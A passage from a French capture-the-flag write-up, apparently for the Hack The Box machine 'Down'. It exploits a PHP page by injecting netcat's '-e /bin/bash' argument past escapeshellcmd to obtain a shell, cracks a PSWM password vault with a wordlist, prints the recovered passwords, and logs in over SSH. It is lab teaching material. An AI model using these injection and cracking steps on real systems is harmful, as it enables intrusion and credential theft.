+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$url</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;|^https?://|&#39;</span><span class="p">,</span><span class="nv">$url</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ec</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="s2">&#34;/usr/bin/curl -s </span><span class="si">$url</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;div class=&#34;output&#34; id=&#34;outputSection&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$rc</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;font size=+1&gt;It is up. It&#39;s just you! =&lt;/font&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s1">&#39;&lt;p id=&#34;outputDetails&#34;&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/p&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;font size=+1&gt;It is down for everyone! =&lt;/font&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;div class=&#34;output&#34; id=&#34;outputSection&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;footer&gt;© 2024 isitdownorjustme LLC&lt;/footer&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div></div>
+<h3 id="netcat">Netcat</h3>
+<p>Je vois bien dans le code, la vérification effectuée par rapport aux protocoles.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$url</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;|^https?://|&#39;</span><span class="p">,</span><span class="nv">$url</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ec</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="s2">&#34;/usr/bin/curl -s </span><span class="si">$url</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;div class=&#34;output&#34; id=&#34;outputSection&#34;&gt;&#39;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>Tout au début du code PHP, je remarque qu&rsquo;il existe une autre page, mais pour y accéder il faut passer le paramètre <code>expertmode=tcp</code> sur la page <code>index.php</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tcp&#39;</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="err">&#39;</span><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Is</span> <span class="nx">the</span> <span class="nx">port</span> <span class="nx">refused</span><span class="p">,</span> <span class="k">or</span> <span class="nx">is</span> <span class="nx">it</span> <span class="nx">just</span> <span class="nx">you</span><span class="o">?&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;urlForm&#34;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;index.php?expertmode=tcp&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;url&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;ip&#34;</span> <span class="nx">placeholder</span><span class="o">=</span><span class="s2">&#34;Please enter an IP.&#34;</span> <span class="nx">required</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/9.png"
+        data-srcset="/images/Down/9.png, /images/Down/9.png 1.5x, /images/Down/9.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/9.png"
+        title="/images/Down/9.png" width="1910" height="999" /></p>
+<p>Dans le code, je vois que l&rsquo;adresse IP et le port sont filtrés. Ce code prend en paramètre une adresse IP et un ports valides, puis exécute la commandes <code>netcat</code> pour vérifier la disponibilité sur site.
+Ici la fonction <code>trim()</code> retourne la chaîne string, après avoir supprimé les caractères invisibles en début et fin de chaîne. Pour plus détails, la <a href="https://www.php.net/manual/fr/function.trim.php" target="_blank" rel="noopener noreffer ">documentation de PHP</a>
+La fonction <code>intval()</code> retourne la valeur numérique entière équivalente d&rsquo;une variable . Pour plus d&rsquo;informations, la <a href="https://www.php.net/manual/fr/function.intval.php" target="_blank" rel="noopener noreffer ">documentation de PHP</a>.
+Sauf que ici, lorsqu&rsquo;il fait appel à la fonction <code>escapeshellcmd()</code>, qui bien qu&rsquo;elle échappe tous les caractères de la susceptible de permettre de l&rsquo;injection de commande, n&rsquo;empêche pas l&rsquo;utilisation de paramètres.
+De plus bien que le port soit, filtré, la variable utilisée dans la commande <code>netcat</code> n&rsquo;est pas filtrée. Elle utilise la variable <code>port</code> plutot que <code>valid_port</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tcp&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$valid_ip</span> <span class="o">=</span> <span class="nx">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$port</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$port_int</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$valid_port</span> <span class="o">=</span> <span class="nx">filter_var</span><span class="p">(</span><span class="nv">$port_int</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_INT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nv">$valid_ip</span> <span class="o">&amp;&amp;</span> <span class="nv">$valid_port</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ec</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="s2">&#34;/usr/bin/nc -vz </span><span class="si">$ip</span><span class="s2"> </span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>Donc il me suffit d&rsquo;ajouter l&rsquo;argument <code>-e /bin/bash</code> de <code>netcat</code> permettant l&rsquo;exécution de commande.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/10.png"
+        data-srcset="/images/Down/10.png, /images/Down/10.png 1.5x, /images/Down/10.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/10.png"
+        title="/images/Down/10.png" width="923" height="408" /></p>
+<p>Et j&rsquo;obtiens un shell en tant que <code>www-data</code>. Je stabilise mon shell.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+</span></span><span class="line"><span class="cl"><span class="n">CTRL</span> <span class="o">+</span> <span class="n">Z</span>
+</span></span><span class="line"><span class="cl"><span class="n">stty</span> <span class="o">-</span><span class="n">echo</span> <span class="n">raw</span><span class="p">;</span><span class="n">fg</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/11.png"
+        data-srcset="/images/Down/11.png, /images/Down/11.png 1.5x, /images/Down/11.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/11.png"
+        title="/images/Down/11.png" width="662" height="475" /></p>
+<p>J&rsquo;obtiens donc le premier flag.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">down</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">332</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Apr</span>  <span class="mi">8</span> <span class="mi">23</span><span class="p">:</span><span class="mi">09</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">3041</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">316218</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="n">logo</span><span class="o">.</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">1794</span> <span class="n">Sep</span>  <span class="mi">6</span>  <span class="mi">2024</span> <span class="n">style</span><span class="o">.</span><span class="n">css</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">rw</span><span class="o">-</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>     <span class="mi">33</span> <span class="n">Apr</span>  <span class="mi">8</span> <span class="mi">23</span><span class="p">:</span><span class="mi">09</span> <span class="n">user_aeT1xa</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">down</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">cat</span> <span class="n">user_aeT1xa</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">REDACTED</span> <span class="n">FLAG</span><span class="o">&gt;</span></span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-aleks">Shell en tant que aleks</h2>
+<h3 id="pswm">PSWM</h3>
+<p>En énumérant les fichiers appartenant à <code>aleks</code>, je vois le fichier <code>./.local/share/pswm/pswm</code> qui est intriguant.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@down:/home/aleks$ find -user aleks 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">./.lesshst
+</span></span><span class="line"><span class="cl">./.bashrc
+</span></span><span class="line"><span class="cl">./.sudo_as_admin_successful
+</span></span><span class="line"><span class="cl">./.local
+</span></span><span class="line"><span class="cl">./.local/share
+</span></span><span class="line"><span class="cl">./.local/share/pswm
+</span></span><span class="line"><span class="cl">./.local/share/pswm/pswm
+</span></span><span class="line"><span class="cl">./.cache
+</span></span><span class="line"><span class="cl">./.ssh
+</span></span><span class="line"><span class="cl">./.profile
+</span></span><span class="line"><span class="cl">./.bash_logout</span></span></code></pre></div></div>
+<p>Le fichier contient du contenu chiffré. Un petite recherche sur internet et je vois qu&rsquo;il s&rsquo;agit de <a href="https://github.com/Julynx/pswm" target="_blank" rel="noopener noreffer ">PSWM</a>, un gestionnaire de mots de passe en ligne de commande écrit en Python. Donc ce fichier contient sûrement les mots de passe.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@down:/home/aleks$ cat ./.local/share/pswm/pswm
+</span></span><span class="line"><span class="cl">e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-d</span></span></code></pre></div></div>
+<p>Donc en recherchant sur google, j&rsquo;ai trouvé un outil sur <a href="https://github.com/seriotonctf/pswm-decryptor" target="_blank" rel="noopener noreffer ">github</a> permettant de déchiffrer sur ma machine le contenu du fichier.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Down/pswm-decryptor on main✘✘✘ using «.venv»
+</span></span><span class="line"><span class="cl">╰─± python3 pswm-decrypt.py -f pswm -w /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">[+] Master Password: flower
+</span></span><span class="line"><span class="cl">[+] Decrypted Data:
+</span></span><span class="line"><span class="cl">+------------+----------+----------------------+
+</span></span><span class="line"><span class="cl">| Alias      | Username | Password             |
+</span></span><span class="line"><span class="cl">+------------+----------+----------------------+
+</span></span><span class="line"><span class="cl">| pswm       | aleks    | flower               |
+</span></span><span class="line"><span class="cl">| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
+</span></span><span class="line"><span class="cl">+------------+----------+----------------------+</span></span></code></pre></div></div>
+<p>Je me connecte donc par SSH en tant qu&rsquo;<code>aleks</code> avec le mot de passe trouvé.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╭─</span><span class="n">root</span> <span class="n">at</span> <span class="n">exegol</span><span class="o">-</span><span class="n">htb</span> <span class="ow">in</span> <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">Down</span><span class="o">/</span><span class="n">pswm</span><span class="o">-</span><span class="n">decryptor</span> <span class="n">on</span> <span class="n">main</span><span class="err">✘✘✘</span>
+</span></span><span class="line"><span class="cl"><span class="err">╰─±</span> <span class="n">ssh</span> <span class="n">aleks</span><span class="err">@</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">204.56</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s1">&#39;10.129.204.56 (10.129.204.56)&#39;</span> <span class="n">can</span><span class="s1">&#39;t be established.</span>
+</span></span><span class="line"><span class="cl"><span class="n">ED25519</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="n">is</span> <span class="n">SHA256</span><span class="p">:</span><span class="n">uq3</span><span class="o">+</span><span class="n">WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">key</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">known</span> <span class="n">by</span> <span class="n">any</span> <span class="n">other</span> <span class="n">names</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">continue</span> <span class="n">connecting</span> <span class="p">(</span><span class="n">yes</span><span class="o">/</span><span class="n">no</span><span class="o">/</span><span class="p">[</span><span class="n">fingerprint</span><span class="p">])</span><span class="err">?</span> <span class="n">yes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Warning</span><span class="p">:</span> <span class="n">Permanently</span> <span class="n">added</span> <span class="s1">&#39;10.129.204.56&#39;</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">list</span> <span class="n">of</span> <span class="n">known</span> <span class="n">hosts</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">aleks</span><span class="err">@</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">204.56</span><span class="p">)</span> <span class="n">Password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04</span><span class="o">.</span><span class="mi">5</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">138</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">System</span> <span class="n">information</span> <span class="n">as</span> <span class="n">of</span> <span class="n">Mon</span> <span class="n">Jun</span> <span class="mi">23</span> <span class="mi">10</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">01</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">System</span> <span class="nb">load</span><span class="p">:</span>           <span class="mf">0.0</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">52.5</span><span class="o">%</span> <span class="n">of</span> <span class="mf">6.92</span><span class="n">GB</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">7</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">227</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">204.56</span>
+</span></span><span class="line"><span class="cl">  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">fe94</span><span class="p">:</span><span class="n">d21a</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Tue</span> <span class="n">Jun</span> <span class="mi">10</span> <span class="mi">15</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">07</span> <span class="mi">2025</span> <span class="n">from</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.67</span>
+</span></span><span class="line"><span class="cl"><span class="n">aleks</span><span class="err">@</span><span class="n">down</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">36</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">aleks</span> <span class="n">aleks</span> <span class="mi">4096</span> <span class="n">May</span> <span class="mi">27</span> <span class="mi">23</span><span class="p">:</span><span class="mi">51</span> <span class="o">.</span>
